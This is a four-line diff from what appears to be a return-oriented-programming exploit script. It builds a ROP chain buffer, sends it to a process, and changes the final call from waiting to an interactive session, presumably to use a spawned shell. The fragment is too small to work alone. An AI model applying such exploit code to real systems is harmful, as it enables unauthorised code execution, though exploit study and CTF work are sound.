@@ -25,4 +25,4 @@ buf = rop.call_chain(
 buf += rop.fill(100, buf)
 
 p.write(buf)
-p.wait(0)
+p.interact(0)
